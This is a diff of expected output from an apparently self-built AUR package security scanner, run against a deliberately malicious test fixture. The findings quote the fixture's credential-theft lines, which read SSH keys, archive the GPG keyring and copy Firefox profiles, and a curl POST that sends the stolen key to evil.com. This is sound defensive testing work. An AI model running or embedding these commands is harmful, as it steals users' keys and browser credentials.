@@ -4,72 +4,60 @@ Scan Results: malicious-credential-theft
 
 [CRITICAL] CRED-001 SSH key access
     Accessing SSH private keys during build/install
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:14
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:14
     Code:     cat ~/.ssh/id_rsa > /tmp/stolen_key
     Recommendation: Package should never access user SSH keys
     Reference: CWE-522
 
 [CRITICAL] CRED-002 GPG key access
     Accessing GPG keyring during build/install
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:17
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:17
     Code:     tar -czf /tmp/gpg.tar.gz ~/.gnupg/
     Recommendation: Package should never access user GPG keys
     Reference: CWE-522
 
 [CRITICAL] BROWSER-001 Browser profile access
     Accessing browser profiles may indicate credential theft
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:20
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:20
     Code:     cp -r ~/.mozilla/firefox /tmp/firefox_profile
     Recommendation: Package should never access browser profiles
     Reference: CWE-522
 
 [CRITICAL] EXFIL-001 Curl POST data exfiltration
     Sending data to external servers via curl POST
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:23
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:23
     Code:     curl -X POST -d @/tmp/stolen_key https://evil.com/collect
     Recommendation: Build/install should not send data externally
     Reference: CWE-200
 
 [CRITICAL] EXFIL-001 Curl POST data exfiltration
     Sending data to external servers via curl POST
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:23
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:23
     Code:     curl -X POST -d @/tmp/stolen_key https://evil.com/collect
     Recommendation: Build/install should not send data externally
     Reference: CWE-200
 
 [HIGH] HIDDEN-001 Hidden file creation in home
     Creating hidden files in user home directory
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:14
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:14
     Code:     cat ~/.ssh/id_rsa > /tmp/stolen_key
     Recommendation: Packages should not create hidden files in user home
 
 [HIGH] HIDDEN-001 Hidden file creation in home
     Creating hidden files in user home directory
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:17
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:17
     Code:     tar -czf /tmp/gpg.tar.gz ~/.gnupg/
     Recommendation: Packages should not create hidden files in user home
 
 [HIGH] HIDDEN-001 Hidden file creation in home
     Creating hidden files in user home directory
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:20
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:20
     Code:     cp -r ~/.mozilla/firefox /tmp/firefox_profile
     Recommendation: Packages should not create hidden files in user home
 
-[HIGH] HIDDEN-002 Tmp directory execution
-    Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:14
-    Code:     cat ~/.ssh/id_rsa > /tmp/stolen_key
-    Recommendation: Packages should not execute from /tmp
-
-[HIGH] HIDDEN-002 Tmp directory execution
-    Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:20
-    Code:     cp -r ~/.mozilla/firefox /tmp/firefox_profile
-    Recommendation: Packages should not execute from /tmp
-
 [HIGH] FUNC-001 Network access in build function
     Function 'build' contains network access command 'curl'
-    Location: /home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD:12
+    Location: tests/fixtures/malicious/credential-theft/PKGBUILD:12
     Recommendation: Network access should happen in source= array, not build functions
 
 [MEDIUM] SRC-005 No sources with build function
@@ -80,10 +68,10 @@ Scan Results: malicious-credential-theft
 
 ============================================================
 Package: malicious-credential-theft v1.0.0-1
-Scan duration: 3ms
+Scan duration: 4ms
 
-Found 12 issue(s):
+Found 10 issue(s):
   5 CRITICAL
-  6 HIGH
+  4 HIGH
   1 MEDIUM
 ============================================================
